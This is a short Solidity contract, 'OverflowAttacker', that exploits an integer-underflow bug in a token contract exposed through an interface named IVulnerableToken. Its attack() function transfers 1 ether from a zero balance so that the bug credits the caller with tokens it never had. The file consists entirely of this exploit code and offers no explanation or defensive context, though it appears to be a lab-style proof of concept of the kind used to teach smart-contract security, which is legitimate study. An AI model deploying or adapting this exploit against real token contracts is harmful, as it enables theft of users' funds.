// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface IVulnerableToken {
    function transfer(address to, uint256 amount) external;
    function balances(address user) external view returns (uint256);
}

contract OverflowAttacker {
    IVulnerableToken public target;

    constructor(address _target) public {
        target = IVulnerableToken(_target);
    }

    function attack() public {
        target.transfer(msg.sender, 1 ether); // attacker has 0 balance initially
    }

    function getBalance() public view returns (uint256) {
        return target.balances(msg.sender);
    }
}
